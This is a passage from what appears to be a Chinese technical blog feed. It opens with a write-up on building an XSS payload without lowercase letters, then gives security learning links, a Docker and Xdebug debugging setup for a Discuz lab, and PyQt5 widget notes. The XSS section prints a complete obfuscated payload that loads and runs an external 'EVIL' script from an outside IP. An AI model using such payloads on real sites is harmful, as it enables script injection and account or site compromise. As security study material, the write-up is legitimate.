&apos;(+(211))[&quot;to&quot;+String[&quot;name&quot;]](31)[1]&apos;,</span><br></pre></td></tr></table></figure><p>然后就把这些粘贴到Chrome Console上看看是如何进行工作的</p><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20191017205251.png" alt></p><p>然后发现可以用大写字母变量来表示小写字母<br>比如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A=&apos;a&apos;= &apos;(false+&quot;&quot;)[1]&apos;</span><br><span class="line">令Á=![]; //false</span><br><span class="line">则A=&apos;a&apos; =&gt; A=&apos;(Á+&quot;&quot;)[1]&apos;</span><br><span class="line">这样 就可以实现大写变量=小写字母</span><br></pre></td></tr></table></figure><p>那么如何执行一个字符串呢</p><p>我第一个想到的是eval()</p><p>但是这里不行，因为不能输入小写，即使用大写拼出来一个eval 也是一个字符串不能执行<br>这里作者用了这个函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][&quot;fill&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</span><br></pre></td></tr></table></figure><p>这样里面的字符串可以用大写字母来拼，非字符串仅仅是<code>[]()&quot;</code>和数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](A+L+E+R+T+&quot;(&quot;+1+&quot;)&quot;)();</span><br></pre></td></tr></table></figure><p>此时这个xss只是一个普通的反射xss</p><p>所以需要通过ajax来进行站内操作提升xss的危害程度</p><p>所以最好是加载一个外部js来执行</p><p>文中作者是要用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.getScript(&quot;//server/test.js&quot;)</span><br></pre></td></tr></table></figure><p>来执行</p><p>所以还需要用大写字母来记录<code>.</code>和<code>/</code>和<code>g</code><br>后两个字符直接用上面所提的网站进行转换</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOT=(+(&quot;11E100&quot;)+[])[1]</span><br><span class="line">G=(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]</span><br><span class="line">SLA=(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]</span><br></pre></td></tr></table></figure><p>又因为jquery是在html加载之后才会定义，所以要执行的payload应该为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function()&#123;$.getScript(&quot;//IP/EVIL&quot;)&#125;,3000)</span><br></pre></td></tr></table></figure><p>转换为大写变量表示为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](S+E+T+&quot;T&quot;+I+M+E+O+U+T+&quot;(&quot;+F+U+N+C+T+I+O+N+&quot;()&#123; $&quot;+DOT+G+E+T+&quot;S&quot;+C+R+I+P+T+&quot;(&apos;&quot;+SLA+SLA+&quot;111.111.111.111&quot;+SLA+&quot;EVIL&apos;)(); &#125;, 3000);&quot;)();</span><br></pre></td></tr></table></figure><p>所以最终的payload应为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Á=![]; //false</span><br><span class="line">É=!![]; //true </span><br><span class="line">Í=[][[]]; //undefined</span><br><span class="line">Ó=+[![]]; //NaN</span><br><span class="line">SI=+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]]);// Infinity</span><br><span class="line">ST=([]+[]); //</span><br><span class="line">Ü=(+[]);</span><br><span class="line">A=(Á+&quot;&quot;)[1];</span><br><span class="line">D=(Í+&quot;&quot;)[2];</span><br><span class="line">E=(É+&quot;&quot;)[3];</span><br><span class="line">F=(Á+&quot;&quot;)[0];</span><br><span class="line">G=[![]+[+[]]+[[]+[]][+[]][[![]+&#123;&#125;][+[]][+!+[]+[+[]]]+[[]+&#123;&#125;][+[]][+!+[]]+[[][[]]+[]][+[]][+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[![]+&#123;&#125;][+[]][+!+[]+[+[]]]+[!![]+[]][+[]][+[]]+[[]+&#123;&#125;][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]][+[]][!+[]+!+[]+[+[]]];</span><br><span class="line">I=([Á]+Í)[10];</span><br><span class="line">L=(Á+&quot;&quot;)[2];</span><br><span class="line">T=(É+&quot;&quot;)[0];</span><br><span class="line">O=(É+[][F+I+L+L])[10];</span><br><span class="line">R=(É+&quot;&quot;)[1];</span><br><span class="line">N=(Í+&quot;&quot;)[1];</span><br><span class="line">M=(+(208))[T+O+&quot;S&quot;+T+R+I+N+G](31)[1];</span><br><span class="line">P=(+(211))[T+O+&quot;S&quot;+T+R+I+N+G](31)[1];</span><br><span class="line">S=(Á+&quot;&quot;)[3];</span><br><span class="line">U=(Í+&quot;&quot;)[0];</span><br><span class="line">V=(+(31))[T+O+&quot;S&quot;+T+R+I+N+G](32);</span><br><span class="line">X=(+(101))[T+O+&quot;S&quot;+T+R+I+N+G](34)[1];</span><br><span class="line">Y=(Ó+[SI])[10];</span><br><span class="line">Z=(+(35))[T+O+&quot;S&quot;+T+R+I+N+G](36);</span><br><span class="line">C=([][F+I+L+L]+&quot;&quot;)[3];</span><br><span class="line">H=(+(101))[T+O+&quot;S&quot;+T+R+I+N+G](21)[1];</span><br><span class="line">K=(+(20))[T+O+&quot;S&quot;+T+R+I+N+G](21);</span><br><span class="line">W=(+(32))[T+O+&quot;S&quot;+T+R+I+N+G](33);</span><br><span class="line">J=([][E+N+T+R+I+E+S]()+&quot;&quot;)[3];</span><br><span class="line">B=([][E+N+T+R+I+E+S]()+&quot;&quot;)[2];</span><br><span class="line">G=(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]</span><br><span class="line">SLA=(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]</span><br><span class="line">[][F+I+L+L][C+O+N+S+T+R+U+C+T+O+R](S+E+T+&quot;T&quot;+I+M+E+O+U+T+&quot;(&quot;+F+U+N+C+T+I+O+N+&quot;()&#123; $&quot;+DOT+G+E+T+&quot;S&quot;+C+R+I+P+T+&quot;(&apos;&quot;+SLA+SLA+&quot;111.111.111.111&quot;+SLA+&quot;EVIL&apos;)(); &#125;, 3000);&quot;)();</span><br></pre></td></tr></table></figure><p>一共2307个字符也没有超过范围</p><p>总结:</p><ol><li>大写字母不仅仅是26个</li><li>用6个字符可以执行任何js代码，只要长度够</li></ol>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss的攻击和防御</title>
      <link href="/posts/633fb4f6/"/>
      <url>/posts/633fb4f6/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>不再多说</p><h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2><p>xss的防御主要</p>]]></content>
      
      
      <categories>
          
          <category> get√ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全学习资源</title>
      <link href="/posts/4b2524a1/"/>
      <url>/posts/4b2524a1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://yangyangwithgnu.github.io/" target="_blank" rel="noopener">yangyangwithgnu</a> - 文章思路很清晰</p><p><a href="https://www.leavesongs.com/" target="_blank" rel="noopener">离别歌</a> - p神博客，代码审计大神</p><p><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener">sec-wiki</a> - 安全综合网站</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker+PhpStorm远程调试php</title>
      <link href="/posts/2077109e/"/>
      <url>/posts/2077109e/</url>
      
        <content type="html"><![CDATA[<h2 id="本文章组织架构"><a class="markdownIt-Anchor" href="#本文章组织架构"></a> 本文章组织架构:</h2><p>host&gt;vbox-ubuntu&gt;docker<br><em>docker是跑在虚拟机中的</em></p><p>host:10.10.44.197<br>ubuntu:10.10.44.219</p><h2 id="先把ssh的端口22暴露出来"><a class="markdownIt-Anchor" href="#先把ssh的端口22暴露出来"></a> 先把ssh的端口22暴露出来</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &apos;2&apos;</span><br><span class="line">services:</span><br><span class="line">  discuz:</span><br><span class="line">    image: vulhub/discuz:7.2</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8080:80&quot;</span><br><span class="line">      - &quot;22:22&quot;</span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.5</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: root</span><br><span class="line">      MYSQL_DATABASE: discuz</span><br></pre></td></tr></table></figure><h2 id="apt-update"><a class="markdownIt-Anchor" href="#apt-update"></a> apt update</h2><h3 id="首先应该更新源因为系统中没有vim和vi所以采用下面的方式来更新"><a class="markdownIt-Anchor" href="#首先应该更新源因为系统中没有vim和vi所以采用下面的方式来更新"></a> 首先应该更新源，因为系统中没有vim和vi，所以采用下面的方式来更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak    </span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure><h3 id="然后apt-update会出现没有公钥的情况"><a class="markdownIt-Anchor" href="#然后apt-update会出现没有公钥的情况"></a> 然后apt update,会出现没有公钥的情况</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">W: GPG error: http://mirrors.aliyun.com trusty-security InRelease: The following signatures couldn&apos;t be verified because the public key is not available: NO_PUBKEY 40976EAF437D05B5 NO_PUBKEY 3B4FE6ACC0B21F32</span><br></pre></td></tr></table></figure><p>我们需要先在公钥服务器中获取公钥，缺几个获取几个</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 40976EAF437D05B5</span><br></pre></td></tr></table></figure><p>公钥服务器还有其他的，我这里用的Ubuntu的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyserver.ubuntu.com</span><br><span class="line">pgp.mit.edu</span><br><span class="line">subkeys.pgp.net</span><br><span class="line">www.gpg-keyserver.de</span><br></pre></td></tr></table></figure><p>然后apt update 即可 update成功</p><h2 id="安装ssh"><a class="markdownIt-Anchor" href="#安装ssh"></a> 安装ssh</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install openssh-server</span><br><span class="line">apt install vim  </span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>进行如下修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PermitRootLogin without-password</span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure><p>此时可能不知道root的密码<br>可用 <code>passwd root</code>修改</p><h2 id="安装xdebug"><a class="markdownIt-Anchor" href="#安装xdebug"></a> 安装Xdebug</h2><p>对应的安装版本如下:<br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725153708.png" alt></p><p>到这里找对应的版本进行下载</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://pecl.php.net/package/xdebug</span><br></pre></td></tr></table></figure><p>或者先下载下来，复制进去,然后进入到所在目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pecl install xdebug-2.5.5.tgz</span><br></pre></td></tr></table></figure><p>配置php.ini</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /usr/local/etc/php/php.ini</span><br><span class="line">如果不对可以先find一下php，phpini本来是没有的</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.show_local_vars=0</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_host=10.10.44.197</span><br></pre></td></tr></table></figure><p>重启一下容器使之生效，注意这里需要再次启动ssh</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure><h2 id="设置-phpstorm"><a class="markdownIt-Anchor" href="#设置-phpstorm"></a> 设置 PhpStorm</h2><h3 id="加入项目"><a class="markdownIt-Anchor" href="#加入项目"></a> 加入项目</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/WeChatc5c33ebb4235cc66dab25b1a244cea5e.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725154342.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725154607.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725154633.png" alt></p><h3 id="设置远程调试"><a class="markdownIt-Anchor" href="#设置远程调试"></a> 设置远程调试</h3><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725152549.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725152745.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725152806.png" alt><br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725152839.png" alt></p><h2 id="安装chrome插件-xdebughelper"><a class="markdownIt-Anchor" href="#安装chrome插件-xdebughelper"></a> 安装chrome插件 XdebugHelper</h2><p>直接从谷歌应用市场搜即可<br>右键插件-&gt;选项，设置key<br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190725153315.png" alt></p><p>然后打开插件，打上断点即可</p><h2 id="坑一开启docker出现端口占用的情况"><a class="markdownIt-Anchor" href="#坑一开启docker出现端口占用的情况"></a> 坑一:开启docker出现端口占用的情况</h2><p>lsof -i :8080 搜不出来<br>必须得加sudo才能搜出来</p><p>搜出来是jekins，kill掉之后还会重新创建<br>必须直接关闭jekins服务</p><p>mac 启动关闭jekins</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动</span><br><span class="line">sudo launchctl load /Library/LaunchDaemons/org.jenkins-ci.plist</span><br><span class="line">关闭</span><br><span class="line">sudo launchctl unload /Library/LaunchDaemons/org.jenkins-ci.plist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PyQt5学习</title>
      <link href="/posts/4509db9a/"/>
      <url>/posts/4509db9a/</url>
      
        <content type="html"><![CDATA[<h2 id="设置快捷键和伙伴关系"><a class="markdownIt-Anchor" href="#设置快捷键和伙伴关系"></a> 设置快捷键和伙伴关系</h2><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190531113852.gif" alt></p><h2 id="设置tab顺序"><a class="markdownIt-Anchor" href="#设置tab顺序"></a> 设置tab顺序</h2><p><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190531114250.png" alt></p><p>designer中可以直接编辑action<br>右键添加工具条<br>拖动action可以放在工具条上<br>三种窗口<br>QMainWindow<br>可以包含菜单栏、工具栏、状态栏<br>QWidget<br>不确定窗口的用途，就使用QWidget<br>QDialog<br>对话窗口的基类，没有菜单栏、工具栏、状态栏</p><p>如何创建一个主窗口<br>如何让主窗口居中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">screen = QDesktopWidget().screenGeometry()</span><br><span class="line"> s = self.geometry()</span><br></pre></td></tr></table></figure><p>退出程序</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app = QApplication.instance()</span><br><span class="line">    app.quit()</span><br></pre></td></tr></table></figure><p>手动添加按钮和水平布局<br><img src="https://adddd-1251699369.cos.ap-shanghai.myqcloud.com/20190531140630.png" alt></p><p>屏幕坐标系</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">.move(<span class="number">250</span>,<span class="number">200</span>)</span><br><span class="line">.resize(<span class="number">300</span>,<span class="number">240</span>)</span><br><span class="line"><span class="comment">#窗口的坐标，工作区的大小</span></span><br><span class="line">.x() <span class="number">250</span></span><br><span class="line">.y() <span class="number">200</span></span><br><span class="line">.width() <span class="number">300</span></span><br><span class="line">.height() <span class="number">240</span></span><br><span class="line"><span class="comment">#工作区的坐标和大小</span></span><br><span class="line">geometry().x() <span class="number">250</span></span><br><span class="line">geometry().y() <span class="number">222</span></span><br><span class="line">geometry().width() <span class="number">300</span> </span><br><span class="line">geometry().height() <span class="number">240</span></span><br><span class="line"><span class="comment">#整个窗口的坐标和大小</span></span><br><span class="line">frameGeometry().x() <span class="number">250</span></span><br><span class="line">frameGeometry().y() <span class="number">200</span></span><br><span class="line">frameGeometry().width() <span class="number">300</span></span><br><span class="line">frameGeometry().height() <span class="number">262</span></span><br></pre></td></tr></table></figure><p>设置icon<br>窗口的setWindowIcon在苹果下面无效在windows下面有效<br>但是application的setWindowIcon在两边都有效</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QApplication.instance().setWindowIcon(QIcon())</span><br><span class="line">QMainWindow.setWindowIcon(QIcon())</span><br></pre></td></tr></table></figure><p>显示控件的提示信息</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">QToolTip.setFont(QFont(<span class="string">'SanSerif'</span>,<span class="number">12</span>))</span><br><span class="line">button.setToolTip(<span class="string">'今天是&lt;b&gt;星期五&lt;b&gt;'</span>) <span class="comment">#支持富文本</span></span><br></pre></td></tr></table></figure><p>QLabel</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">label = QLabel(<span class="string">"&amp;Name"</span>,self) <span class="comment">#开启热键，热键只有windows有效</span></span><br><span class="line">label.setText(<span class="string">"这是一个文本&lt;b&gt;标签&lt;/b&gt;"</span>)</span><br><span class="line">label.setAutoFillBackground(<span class="literal">True</span>)</span><br><span class="line">palette = QPalette()</span><br><span class="line">palette.setColor(QPalette.Window,Qt.blue)</span><br><span class="line">label.setPalette(palette)</span><br><span class="line">label.setAlignment(Qt.AlignCenter)</span><br><span class="line">label.setBuddy(passwordLineEdit) <span class="comment">#设置伙伴关系</span></span><br><span class="line"><span class="comment">#设置图片</span></span><br><span class="line">label.setPixmap(QPixmap(<span class="string">"./images/python.jpg"</span>))</span><br><span class="line">label.setText(<span class="string">"&lt;a href ='http://www.baidu.com'&gt;链接&lt;/a&gt;"</span>)</span><br><span class="line">label.setOpenExternalLinks(<span class="literal">True</span>) <span class="comment">#label中的超链接是否生效</span></span><br><span class="line"></span><br><span class="line">label.ajustSize() <span class="comment"># 根据内容自适应大小</span></span><br></pre></td></tr></table></figure><p>QLineEdit</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">    QLineEdit 回显模式</span></span><br><span class="line"><span class="string">    4种回显模式</span></span><br><span class="line"><span class="string">    1.Normal  输入一个显示一个</span></span><br><span class="line"><span class="string">    2.NoEcho  不显示</span></span><br><span class="line"><span class="string">    3.Password  密码</span></span><br><span class="line"><span class="string">    4.PasswordEcho  先显示然后变成*</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    qline = QLineEdit()</span><br><span class="line">    qline.setEchoMode(QLineEdit.Normal)</span><br></pre></td></tr></table></figure><p>QLineEdit 校验器</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建三个文本框</span></span><br><span class="line">pIntLineEdit=QLineEdit()</span><br><span class="line">pDoubleLineEdit=QLineEdit()</span><br><span class="line">pValidatorLineEdit=QLineEdit()</span><br><span class="line"><span class="comment">#实例化整型验证器，并设置范围为1-99</span></span><br><span class="line">pIntvalidator=QIntValidator(self)</span><br><span class="line">pIntvalidator.setRange(<span class="number">1</span>,<span class="number">99</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#浮点型 范围 【-360,360】，精度 小数点后两位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实例化浮点验证器，设置范围-360到360</span></span><br><span class="line">pDoubleValidator=QDoubleValidator()</span><br><span class="line">pDoubleValidator.setRange(<span class="number">-360</span>,<span class="number">360</span>)</span><br><span class="line"></span><br><span class="line">pDoubleValidator.setNotation(QDoubleValidator.StandardNotation)</span><br><span class="line"><span class="comment">#设置精度小数点后两位</span></span><br><span class="line">pDoubleValidator.setDecimals(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#字母和数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置文本允许出现的字符内容</span></span><br><span class="line">reg=QRegExp(<span class="string">'[a-zA-Z0-9]+$'</span>)</span><br><span class="line"><span class="comment">#自定义文本验证器</span></span><br><span class="line">pValidator=QRegExpValidator(self)</span><br><span class="line"><span class="comment">#设置属性</span></span><br><span class="line">pValidator.setRegExp(reg)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置验证器</span></span><br><span class="line">pIntLineEdit.setValidator(pIntvalidator)</span><br><span class="line">pDoubleLineEdit.setValidator(pDoubleValidator)</span><br><span class="line">pValidatorLineEdit.setValidator(pValidator)</span><br></pre></td></tr></table></figure><p>LineEdit 掩码</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建4个文本框</span></span><br><span class="line">pIPlineEdit=QLineEdit()</span><br><span class="line">pMAXlineEdit=QLineEdit()</span><br><span class="line">pDatelineEdit=QLineEdit()</span><br><span class="line">pLiceseLineEdit=QLineEdit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#setInputMask():设置掩码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ip地址掩码</span></span><br><span class="line">pIPlineEdit.setInputMask(<span class="string">'000.000.000.000;_'</span>)</span><br><span class="line"><span class="comment">#Mac地址掩码</span></span><br><span class="line">pMAXlineEdit.setInputMask(<span class="string">'HH:HH:HH:HH:HH:HH;_'</span>)</span><br><span class="line"><span class="comment">#日期掩码</span></span><br><span class="line">pDatelineEdit.setInputMask(<span class="string">'0000-00-00'</span>)</span><br><span class="line"><span class="comment">#许可证掩码</span></span><br><span class="line">pLiceseLineEdit.setInputMask(<span class="string">'&gt;AAAAA-AAAAA-AAAAA-AAAAA-AAAAA;#'</span>)</span><br></pre></td></tr></table></figure><p>QTextEdit</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">self.textEdit.setPlainText(<span class="string">'Hello PyQt5!\n单击按钮'</span>)</span><br><span class="line">self.textEdit.setHtml(<span class="string">"&lt;font color='red' size='6'&gt;&lt;red&gt;Hello PyQt5!\n单击按钮。&lt;/font&gt;"</span>)</span><br><span class="line">self.textEdit.toPlainText()</span><br><span class="line">self.textEdit.toHtml()</span><br></pre></td></tr></table></figure><p>QPushButton</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自己指定调用槽的参数</span></span><br><span class="line">self.btn2.clicked.connect(<span class="keyword">lambda</span> :self.whichbtn(self.btn2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whichbtn</span><span class="params">(self,btn)</span>:</span></span><br><span class="line">    <span class="comment">#输出被点击的按钮</span></span><br><span class="line">    print(<span class="string">'clicked button is '</span>+btn.text())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文本前面显示图片</span></span><br><span class="line">self.btn2.setIcon(QIcon(QPixmap(<span class="string">'E:\pyqt5快速开发与实战\第四章\images\python.png'</span>)))</span><br></pre></td></tr></table></figure><p>QRadioButton</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 当按钮处于一个父widget时互斥</span></span><br><span class="line">self.btn2.toggled.connect(<span class="keyword">lambda</span>: self.btnstate(self.btn2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">btnstate</span><span class="params">(self,btn)</span>:</span></span><br><span class="line">    <span class="comment">#输出按钮1与按钮2的状态，选中还是没选中</span></span><br><span class="line">        <span class="keyword">if</span> btn.text()==<span class="string">'Button1'</span>:</span><br><span class="line">            <span class="keyword">if</span> btn.isChecked()==<span class="literal">True</span>:</span><br><span class="line">                print(btn.text()+<span class="string">"is selected"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(btn.text()+<span class="string">"is deselected"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 被选中和取消选中都会相应信号</span></span><br></pre></td></tr></table></figure><p>QCheckBox</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Qt.Checked            2组件没有被选中（默认）</span></span><br><span class="line"><span class="string">Qt.PartiallyChecked    1组件被半选中</span></span><br><span class="line"><span class="string">Qt.Unchecked        0组件被选中</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">self.checkBox3.setTristate(<span class="literal">True</span>) <span class="comment">#设置为True才会显示半选中的状态</span></span><br></pre></td></tr></table></figure><p>QCombox</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>addItem()</td><td>添加一个下拉选项</td></tr><tr><td>—</td><td>—</td></tr><tr><td>addItems()</td><td>从列表中添加下拉选项</td></tr><tr><td>Clear()</td><td>删除下拉选项集合中的所有选项</td></tr><tr><td>count()</td><td>返回下拉选项集合中的数目</td></tr><tr><td>currentText()</td><td>返回选中选项的文本</td></tr><tr><td>itemText(i)</td><td>获取索引为i的item的选项文本</td></tr><tr><td>currentIndex()</td><td>返回选中项的索引</td></tr><tr><td>setItemText(int 